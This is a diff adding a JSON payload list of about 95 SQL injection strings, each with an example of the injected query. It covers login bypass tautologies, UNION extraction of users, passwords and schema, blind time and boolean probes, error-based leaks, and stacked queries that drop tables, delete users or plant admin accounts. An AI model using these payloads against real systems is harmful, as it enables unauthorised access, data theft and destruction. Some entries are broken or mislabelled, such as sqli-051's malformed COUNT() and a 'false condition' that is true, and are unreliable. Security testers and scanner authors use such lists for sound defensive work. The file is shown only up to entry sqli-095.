@@ -1,0 +1,902 @@
+[
+  {
+    "id": "sqli-001",
+    "description": "Basic tautology-based SQL injection",
+    "payload": "' OR '1'='1",
+    "context": "Login form username input",
+    "type": "tautology",
+    "severity": "high",
+    "example_query": "SELECT * FROM users WHERE username = '' OR '1'='1' AND password = ''"
+  },
+  {
+    "id": "sqli-002",
+    "description": "Union-based SQL injection to extract data",
+    "payload": "' UNION SELECT username, password FROM users--",
+    "context": "Search input field",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT username, password FROM users--"
+  },
+  {
+    "id": "sqli-003",
+    "description": "Blind SQL injection with time delay",
+    "payload": "'; WAITFOR DELAY '0:0:5'--",
+    "context": "ID parameter in URL",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM orders WHERE id = ''; WAITFOR DELAY '0:0:5'--"
+  },
+  {
+    "id": "sqli-004",
+    "description": "Error-based SQL injection to reveal database version",
+    "payload": "' AND 1=CONVERT(int,@@version)--",
+    "context": "User ID input",
+    "type": "error-based",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE id = '' AND 1=CONVERT(int,@@version)--"
+  },
+  {
+    "id": "sqli-005",
+    "description": "Boolean-based blind SQL injection",
+    "payload": "' AND 1=1--",
+    "context": "Search field",
+    "type": "boolean-blind",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' AND 1=1--"
+  },
+  {
+    "id": "sqli-006",
+    "description": "Stacked queries to execute multiple statements",
+    "payload": "'; DROP TABLE users--",
+    "context": "User input in form",
+    "type": "stacked-queries",
+    "severity": "critical",
+    "example_query": "SELECT * FROM users WHERE username = ''; DROP TABLE users--"
+  },
+  {
+    "id": "sqli-007",
+    "description": "Using comment to truncate query",
+    "payload": "' OR 1=1--",
+    "context": "Login password field",
+    "type": "tautology",
+    "severity": "high",
+    "example_query": "SELECT * FROM users WHERE password = '' OR 1=1--"
+  },
+  {
+    "id": "sqli-008",
+    "description": "Hex encoded payload",
+    "payload": "0x27 OR 0x31=0x31--",
+    "context": "URL parameter",
+    "type": "tautology",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE id = 0x27 OR 0x31=0x31--"
+  },
+  {
+    "id": "sqli-009",
+    "description": "Using sleep for blind time-based injection",
+    "payload": "'; SELECT pg_sleep(5)--",
+    "context": "PostgreSQL ID parameter",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM orders WHERE id = ''; SELECT pg_sleep(5)--"
+  },
+  {
+    "id": "sqli-010",
+    "description": "Extracting database user with error-based injection",
+    "payload": "' AND 1=CONVERT(int,USER())--",
+    "context": "User input",
+    "type": "error-based",
+    "severity": "medium",
+    "example_query": "SELECT * FROM accounts WHERE user = '' AND 1=CONVERT(int,USER())--"
+  },
+  {
+    "id": "sqli-011",
+    "description": "Blind boolean-based injection with AND condition",
+    "payload": "' AND SUBSTRING(@@version,1,1)='5'--",
+    "context": "Search input",
+    "type": "boolean-blind",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' AND SUBSTRING(@@version,1,1)='5'--"
+  },
+  {
+    "id": "sqli-012",
+    "description": "Using OR with false condition to bypass filters",
+    "payload": "' OR 'a'='a",
+    "context": "Login username",
+    "type": "tautology",
+    "severity": "high",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 'a'='a' AND password = ''"
+  },
+  {
+    "id": "sqli-013",
+    "description": "Using double dash comment to truncate query",
+    "payload": "' OR 1=1-- -",
+    "context": "Search field",
+    "type": "tautology",
+    "severity": "high",
+    "example_query": "SELECT * FROM items WHERE name = '' OR 1=1-- -"
+  },
+  {
+    "id": "sqli-014",
+    "description": "Using inline comment to bypass filters",
+    "payload": "'//OR//1=1--",
+    "context": "Login form",
+    "type": "tautology",
+    "severity": "high",
+    "example_query": "SELECT * FROM users WHERE username = ''//OR//1=1--"
+  },
+  {
+    "id": "sqli-015",
+    "description": "Using cast to bypass filters",
+    "payload": "' OR CAST('a' AS INT)=CAST('a' AS INT)--",
+    "context": "User input",
+    "type": "tautology",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR CAST('a' AS INT)=CAST('a' AS INT)--"
+  },
+  {
+    "id": "sqli-016",
+    "description": "Using sleep in MySQL for time-based blind injection",
+    "payload": "' OR SLEEP(5)--",
+    "context": "ID parameter",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM orders WHERE id = '' OR SLEEP(5)--"
+  },
+  {
+    "id": "sqli-017",
+    "description": "Using extractvalue for error-based injection",
+    "payload": "' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",
+    "context": "User input",
+    "type": "error-based",
+    "severity": "high",
+    "example_query": "SELECT * FROM users WHERE id = '' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--"
+  },
+  {
+    "id": "sqli-018",
+    "description": "Using updatexml for error-based injection",
+    "payload": "' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--",
+    "context": "User input",
+    "type": "error-based",
+    "severity": "high",
+    "example_query": "SELECT * FROM users WHERE id = '' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)--"
+  },
+  {
+    "id": "sqli-019",
+    "description": "Using sleep in PostgreSQL for time-based injection",
+    "payload": "'; SELECT pg_sleep(10)--",
+    "context": "ID parameter",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM orders WHERE id = ''; SELECT pg_sleep(10)--"
+  },
+  {
+    "id": "sqli-020",
+    "description": "Using OR with false condition and comment",
+    "payload": "' OR 1=1#",
+    "context": "Login form",
+    "type": "tautology",
+    "severity": "high",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 1=1#"
+  },
+  {
+    "id": "sqli-021",
+    "description": "Using OR with sleep for time delay in MySQL",
+    "payload": "' OR SLEEP(10)--",
+    "context": "Search input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SLEEP(10)--"
+  },
+  {
+    "id": "sqli-022",
+    "description": "Using UNION SELECT with NULLs to bypass column count",
+    "payload": "' UNION SELECT NULL, NULL, username, password FROM users--",
+    "context": "Search field",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT id, name, description FROM products WHERE name = '' UNION SELECT NULL, NULL, username, password FROM users--"
+  },
+  {
+    "id": "sqli-023",
+    "description": "Using OR with false condition and inline comment",
+    "payload": "' OR 1=1/*",
+    "context": "Login username",
+    "type": "tautology",
+    "severity": "high",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 1=1/*"
+  },
+  {
+    "id": "sqli-024",
+    "description": "Using AND with subquery for blind boolean injection",
+    "payload": "' AND (SELECT COUNT(*) FROM users) > 0--",
+    "context": "Search input",
+    "type": "boolean-blind",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' AND (SELECT COUNT(*) FROM users) > 0--"
+  },
+  {
+    "id": "sqli-025",
+    "description": "Using OR with sleep for time delay in PostgreSQL",
+    "payload": "' OR pg_sleep(7)--",
+    "context": "ID parameter",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM orders WHERE id = '' OR pg_sleep(7)--"
+  },
+  {
+    "id": "sqli-026",
+    "description": "Using UNION SELECT with database() function",
+    "payload": "' UNION SELECT database(), NULL--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT database(), NULL--"
+  },
+  {
+    "id": "sqli-027",
+    "description": "Using OR with sleep for time delay in SQL Server",
+    "payload": "'; WAITFOR DELAY '0:0:10'--",
+    "context": "User ID input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:10'--"
+  },
+  {
+    "id": "sqli-028",
+    "description": "Using OR with cast to bypass filters",
+    "payload": "' OR CAST(1 AS INT)=1--",
+    "context": "Login form",
+    "type": "tautology",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR CAST(1 AS INT)=1--"
+  },
+  {
+    "id": "sqli-029",
+    "description": "Using OR with substring for blind boolean injection",
+    "payload": "' OR SUBSTRING(user(),1,1)='r'--",
+    "context": "Search input",
+    "type": "boolean-blind",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SUBSTRING(user(),1,1)='r'--"
+  },
+  {
+    "id": "sqli-030",
+    "description": "Using OR with sleep for time delay in Oracle",
+    "payload": "' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(5))--",
+    "context": "User input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(5))--"
+  },
+  {
+    "id": "sqli-031",
+    "description": "Using UNION SELECT with information_schema.tables",
+    "payload": "' UNION SELECT table_name, NULL FROM information_schema.tables--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT table_name, NULL FROM information_schema.tables--"
+  },
+  {
+    "id": "sqli-032",
+    "description": "Using OR with sleep for time delay in SQLite",
+    "payload": "' OR (SELECT sleep(5))--",
+    "context": "ID parameter",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM orders WHERE id = '' OR (SELECT sleep(5))--"
+  },
+  {
+    "id": "sqli-033",
+    "description": "Using OR with hex encoded string",
+    "payload": "' OR 0x61646d696e=0x61646d696e--",
+    "context": "Login username",
+    "type": "tautology",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 0x61646d696e=0x61646d696e--"
+  },
+  {
+    "id": "sqli-034",
+    "description": "Using OR with sleep for time delay in MySQL with comment",
+    "payload": "' OR SLEEP(5)#",
+    "context": "Search input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SLEEP(5)#"
+  },
+  {
+    "id": "sqli-035",
+    "description": "Using UNION SELECT with user() function",
+    "payload": "' UNION SELECT user(), NULL--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT user(), NULL--"
+  },
+  {
+    "id": "sqli-036",
+    "description": "Using OR with sleep for time delay in PostgreSQL with comment",
+    "payload": "' OR pg_sleep(3)--",
+    "context": "ID parameter",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM orders WHERE id = '' OR pg_sleep(3)--"
+  },
+  {
+    "id": "sqli-037",
+    "description": "Using OR with sleep for time delay in SQL Server with comment",
+    "payload": "'; WAITFOR DELAY '0:0:3'--",
+    "context": "User ID input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:3'--"
+  },
+  {
+    "id": "sqli-038",
+    "description": "Using OR with substring for blind boolean injection with comment",
+    "payload": "' OR SUBSTRING(@@version,1,1)='5'--",
+    "context": "Search input",
+    "type": "boolean-blind",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='5'--"
+  },
+  {
+    "id": "sqli-039",
+    "description": "Using OR with sleep for time delay in Oracle with comment",
+    "payload": "' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(3))--",
+    "context": "User input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(3))--"
+  },
+  {
+    "id": "sqli-040",
+    "description": "Using stacked queries to insert data",
+    "payload": "'; INSERT INTO users (username, password) VALUES ('attacker', 'pass')--",
+    "context": "User input",
+    "type": "stacked-queries",
+    "severity": "critical",
+    "example_query": "SELECT * FROM users WHERE username = ''; INSERT INTO users (username, password) VALUES ('attacker', 'pass')--"
+  },
+  {
+    "id": "sqli-041",
+    "description": "Using OR with sleep for time delay in MySQL with inline comment",
+    "payload": "' OR SLEEP(8)/*",
+    "context": "Search input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SLEEP(8)/*"
+  },
+  {
+    "id": "sqli-042",
+    "description": "Using UNION SELECT to extract table names",
+    "payload": "' UNION SELECT table_name, NULL FROM information_schema.tables--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT table_name, NULL FROM information_schema.tables--"
+  },
+  {
+    "id": "sqli-043",
+    "description": "Using OR with substring for blind boolean injection with inline comment",
+    "payload": "' OR SUBSTRING(user(),1,1)='a'/*",
+    "context": "Login input",
+    "type": "boolean-blind",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR SUBSTRING(user(),1,1)='a'/*"
+  },
+  {
+    "id": "sqli-044",
+    "description": "Using stacked queries to update data",
+    "payload": "'; UPDATE users SET password='hacked' WHERE username='admin'--",
+    "context": "User input",
+    "type": "stacked-queries",
+    "severity": "critical",
+    "example_query": "SELECT * FROM users WHERE username = ''; UPDATE users SET password='hacked' WHERE username='admin'--"
+  },
+  {
+    "id": "sqli-045",
+    "description": "Using OR with sleep for time delay in PostgreSQL with inline comment",
+    "payload": "' OR pg_sleep(6)/*",
+    "context": "ID parameter",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM orders WHERE id = '' OR pg_sleep(6)/*"
+  },
+  {
+    "id": "sqli-046",
+    "description": "Using UNION SELECT to extract column names",
+    "payload": "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--"
+  },
+  {
+    "id": "sqli-047",
+    "description": "Using OR with cast for tautology",
+    "payload": "' OR CAST('1' AS INT)=1--",
+    "context": "Login form",
+    "type": "tautology",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR CAST('1' AS INT)=1--"
+  },
+  {
+    "id": "sqli-048",
+    "description": "Using OR with sleep for time delay in SQL Server with inline comment",
+    "payload": "'; WAITFOR DELAY '0:0:7'/*",
+    "context": "User ID input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:7'/*"
+  },
+  {
+    "id": "sqli-049",
+    "description": "Using OR with substring for blind boolean injection with hash comment",
+    "payload": "' OR SUBSTRING(@@version,1,1)='8'#",
+    "context": "Search input",
+    "type": "boolean-blind",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='8'#"
+  },
+  {
+    "id": "sqli-050",
+    "description": "Using UNION SELECT to extract user()",
+    "payload": "' UNION SELECT user(), NULL--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT user(), NULL--"
+  },
+  {
+    "id": "sqli-051",
+    "description": "Using OR with sleep for time delay in Oracle with inline comment",
+    "payload": "' OR 1=(SELECT COUNT() FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(7))/",
+    "context": "User input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT() FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(7))/"
+  },
+  {
+    "id": "sqli-052",
+    "description": "Using stacked queries to delete data",
+    "payload": "'; DELETE FROM users WHERE username='guest'--",
+    "context": "User input",
+    "type": "stacked-queries",
+    "severity": "critical",
+    "example_query": "SELECT * FROM users WHERE username = ''; DELETE FROM users WHERE username='guest'--"
+  },
+  {
+    "id": "sqli-053",
+    "description": "Using OR with hex encoded tautology",
+    "payload": "' OR 0x31=0x31--",
+    "context": "Login username",
+    "type": "tautology",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 0x31=0x31--"
+  },
+  {
+    "id": "sqli-054",
+    "description": "Using OR with sleep for time delay in MySQL with hash comment",
+    "payload": "' OR SLEEP(9)#",
+    "context": "Search input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SLEEP(9)#"
+  },
+  {
+    "id": "sqli-055",
+    "description": "Using UNION SELECT to extract schema names",
+    "payload": "' UNION SELECT schema_name, NULL FROM information_schema.schemata--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT schema_name, NULL FROM information_schema.schemata--"
+  },
+  {
+    "id": "sqli-056",
+    "description": "Using OR with sleep for time delay in PostgreSQL with hash comment",
+    "payload": "' OR pg_sleep(4)#",
+    "context": "ID parameter",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM orders WHERE id = '' OR pg_sleep(4)#"
+  },
+  {
+    "id": "sqli-057",
+    "description": "Using OR with cast for tautology with inline comment",
+    "payload": "' OR CAST(1 AS INT)=1/*",
+    "context": "Login form",
+    "type": "tautology",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR CAST(1 AS INT)=1/*"
+  },
+  {
+    "id": "sqli-058",
+    "description": "Using OR with substring for blind boolean injection with inline comment",
+    "payload": "' OR SUBSTRING(user(),1,1)='b'/*",
+    "context": "Search input",
+    "type": "boolean-blind",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SUBSTRING(user(),1,1)='b'/*"
+  },
+  {
+    "id": "sqli-059",
+    "description": "Using UNION SELECT to extract current database",
+    "payload": "' UNION SELECT database(), NULL--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT database(), NULL--"
+  },
+  {
+    "id": "sqli-060",
+    "description": "Using stacked queries to create new user",
+    "payload": "'; INSERT INTO users (username, password) VALUES ('newuser', 'pass123')--",
+    "context": "User input",
+    "type": "stacked-queries",
+    "severity": "critical",
+    "example_query": "SELECT * FROM users WHERE username = ''; INSERT INTO users (username, password) VALUES ('newuser', 'pass123')--"
+  },
+  {
+    "id": "sqli-061",
+    "description": "Using OR with sleep for time delay in SQL Server with hash comment",
+    "payload": "'; WAITFOR DELAY '0:0:5'#",
+    "context": "User ID input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:5'#"
+  },
+  {
+    "id": "sqli-062",
+    "description": "Using OR with substring for blind boolean injection with hash comment",
+    "payload": "' OR SUBSTRING(@@version,1,1)='9'#",
+    "context": "Search input",
+    "type": "boolean-blind",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='9'#"
+  },
+  {
+    "id": "sqli-063",
+    "description": "Using UNION SELECT to extract user privileges",
+    "payload": "' UNION SELECT user(), NULL--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT user(), NULL--"
+  },
+  {
+    "id": "sqli-064",
+    "description": "Using OR with sleep for time delay in Oracle with hash comment",
+    "payload": "' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(4))#",
+    "context": "User input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(4))#"
+  },
+  {
+    "id": "sqli-065",
+    "description": "Using stacked queries to drop table",
+    "payload": "'; DROP TABLE sessions--",
+    "context": "User input",
+    "type": "stacked-queries",
+    "severity": "critical",
+    "example_query": "SELECT * FROM users WHERE username = ''; DROP TABLE sessions--"
+  },
+  {
+    "id": "sqli-066",
+    "description": "Using OR with hex encoded tautology with comment",
+    "payload": "' OR 0x41=0x41--",
+    "context": "Login username",
+    "type": "tautology",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 0x41=0x41--"
+  },
+  {
+    "id": "sqli-067",
+    "description": "Using OR with sleep for time delay in MySQL with double dash comment",
+    "payload": "' OR SLEEP(11)--",
+    "context": "Search input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SLEEP(11)--"
+  },
+  {
+    "id": "sqli-068",
+    "description": "Using UNION SELECT to extract schema names with comment",
+    "payload": "' UNION SELECT schema_name, NULL FROM information_schema.schemata--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT schema_name, NULL FROM information_schema.schemata--"
+  },
+  {
+    "id": "sqli-069",
+    "description": "Using OR with sleep for time delay in PostgreSQL with double dash comment",
+    "payload": "' OR pg_sleep(12)--",
+    "context": "ID parameter",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM orders WHERE id = '' OR pg_sleep(12)--"
+  },
+  {
+    "id": "sqli-070",
+    "description": "Using stacked queries to update admin password",
+    "payload": "'; UPDATE users SET password='newpass' WHERE username='admin'--",
+    "context": "User input",
+    "type": "stacked-queries",
+    "severity": "critical",
+    "example_query": "SELECT * FROM users WHERE username = ''; UPDATE users SET password='newpass' WHERE username='admin'--"
+  },
+  {
+    "id": "sqli-071",
+    "description": "Using OR with sleep for time delay in MySQL with double dash comment",
+    "payload": "' OR SLEEP(12)--",
+    "context": "Search input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SLEEP(12)--"
+  },
+  {
+    "id": "sqli-072",
+    "description": "Using UNION SELECT to extract column names with comment",
+    "payload": "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='orders'--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='orders'--"
+  },
+  {
+    "id": "sqli-073",
+    "description": "Using OR with substring for blind boolean injection with double dash comment",
+    "payload": "' OR SUBSTRING(user(),1,1)='c'--",
+    "context": "Login input",
+    "type": "boolean-blind",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR SUBSTRING(user(),1,1)='c'--"
+  },
+  {
+    "id": "sqli-074",
+    "description": "Using stacked queries to insert admin user",
+    "payload": "'; INSERT INTO users (username, password, role) VALUES ('admin2', 'pass123', 'admin')--",
+    "context": "User input",
+    "type": "stacked-queries",
+    "severity": "critical",
+    "example_query": "SELECT * FROM users WHERE username = ''; INSERT INTO users (username, password, role) VALUES ('admin2', 'pass123', 'admin')--"
+  },
+  {
+    "id": "sqli-075",
+    "description": "Using OR with sleep for time delay in PostgreSQL with double dash comment",
+    "payload": "' OR pg_sleep(8)--",
+    "context": "ID parameter",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM orders WHERE id = '' OR pg_sleep(8)--"
+  },
+  {
+    "id": "sqli-076",
+    "description": "Using UNION SELECT to extract database version",
+    "payload": "' UNION SELECT @@version, NULL--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT @@version, NULL--"
+  },
+  {
+    "id": "sqli-077",
+    "description": "Using OR with cast for tautology with double dash comment",
+    "payload": "' OR CAST('1' AS INT)=1--",
+    "context": "Login form",
+    "type": "tautology",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR CAST('1' AS INT)=1--"
+  },
+  {
+    "id": "sqli-078",
+    "description": "Using OR with sleep for time delay in SQL Server with double dash comment",
+    "payload": "'; WAITFOR DELAY '0:0:8'--",
+    "context": "User ID input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:8'--"
+  },
+  {
+    "id": "sqli-079",
+    "description": "Using OR with substring for blind boolean injection with double dash comment",
+    "payload": "' OR SUBSTRING(@@version,1,1)='7'--",
+    "context": "Search input",
+    "type": "boolean-blind",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='7'--"
+  },
+  {
+    "id": "sqli-080",
+    "description": "Using UNION SELECT to extract current user",
+    "payload": "' UNION SELECT user(), NULL--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT user(), NULL--"
+  },
+  {
+    "id": "sqli-081",
+    "description": "Using OR with sleep for time delay in Oracle with double dash comment",
+    "payload": "' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(8))--",
+    "context": "User input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(8))--"
+  },
+  {
+    "id": "sqli-082",
+    "description": "Using stacked queries to delete admin user",
+    "payload": "'; DELETE FROM users WHERE username='admin'--",
+    "context": "User input",
+    "type": "stacked-queries",
+    "severity": "critical",
+    "example_query": "SELECT * FROM users WHERE username = ''; DELETE FROM users WHERE username='admin'--"
+  },
+  {
+    "id": "sqli-083",
+    "description": "Using OR with hex encoded tautology with double dash comment",
+    "payload": "' OR 0x42=0x42--",
+    "context": "Login username",
+    "type": "tautology",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 0x42=0x42--"
+  },
+  {
+    "id": "sqli-084",
+    "description": "Using OR with sleep for time delay in MySQL with double dash comment",
+    "payload": "' OR SLEEP(13)--",
+    "context": "Search input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SLEEP(13)--"
+  },
+  {
+    "id": "sqli-085",
+    "description": "Using UNION SELECT to extract schema names with double dash comment",
+    "payload": "' UNION SELECT schema_name, NULL FROM information_schema.schemata--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT schema_name, NULL FROM information_schema.schemata--"
+  },
+  {
+    "id": "sqli-086",
+    "description": "Using OR with sleep for time delay in PostgreSQL with double dash comment",
+    "payload": "' OR pg_sleep(14)--",
+    "context": "ID parameter",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM orders WHERE id = '' OR pg_sleep(14)--"
+  },
+  {
+    "id": "sqli-087",
+    "description": "Using OR with cast for tautology with double dash comment",
+    "payload": "' OR CAST(1 AS INT)=1--",
+    "context": "Login form",
+    "type": "tautology",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR CAST(1 AS INT)=1--"
+  },
+  {
+    "id": "sqli-088",
+    "description": "Using OR with substring for blind boolean injection with double dash comment",
+    "payload": "' OR SUBSTRING(user(),1,1)='d'--",
+    "context": "Search input",
+    "type": "boolean-blind",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SUBSTRING(user(),1,1)='d'--"
+  },
+  {
+    "id": "sqli-089",
+    "description": "Using UNION SELECT to extract current database with double dash comment",
+    "payload": "' UNION SELECT database(), NULL--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT database(), NULL--"
+  },
+  {
+    "id": "sqli-090",
+    "description": "Using stacked queries to create new admin user",
+    "payload": "'; INSERT INTO users (username, password, role) VALUES ('superadmin', 'pass456', 'admin')--",
+    "context": "User input",
+    "type": "stacked-queries",
+    "severity": "critical",
+    "example_query": "SELECT * FROM users WHERE username = ''; INSERT INTO users (username, password, role) VALUES ('superadmin', 'pass456', 'admin')--"
+  },
+  {
+    "id": "sqli-091",
+    "description": "Using OR with sleepfor time delay in SQL Server with double dash comment",
+    "payload": "'; WAITFOR DELAY '0:0:9'--",
+    "context": "User ID input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE id = ''; WAITFOR DELAY '0:0:9'--"
+  },
+  {
+    "id": "sqli-092",
+    "description": "Using OR with substring for blind boolean injection with double dash comment",
+    "payload": "' OR SUBSTRING(@@version,1,1)='6'--",
+    "context": "Search input",
+    "type": "boolean-blind",
+    "severity": "medium",
+    "example_query": "SELECT * FROM products WHERE name = '' OR SUBSTRING(@@version,1,1)='6'--"
+  },
+  {
+    "id": "sqli-093",
+    "description": "Using UNION SELECT to extract user privileges with double dash comment",
+    "payload": "' UNION SELECT user(), NULL--",
+    "context": "Search input",
+    "type": "union",
+    "severity": "high",
+    "example_query": "SELECT name, description FROM products WHERE name = '' UNION SELECT user(), NULL--"
+  },
+  {
+    "id": "sqli-094",
+    "description": "Using OR with sleep for time delay in Oracle with double dash comment",
+    "payload": "' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(9))--",
+    "context": "User input",
+    "type": "blind-time",
+    "severity": "medium",
+    "example_query": "SELECT * FROM users WHERE username = '' OR 1=(SELECT COUNT(*) FROM all_users WHERE ROWNUM=1 AND DBMS_LOCK.SLEEP(9))--"
+  },
+  {
+    "id": "sqli-095",
+    "description": "Using stacked queries to drop sessions table",
+    "payload": "'; DROP TABLE sessions--",
+    "context": "User input",
+    "type": "stacked-queries",
+    "severity": "critical",
+    "example_query": "SELECT * FROM users WHERE username = ''; DROP TABLE sessions--"
+  },
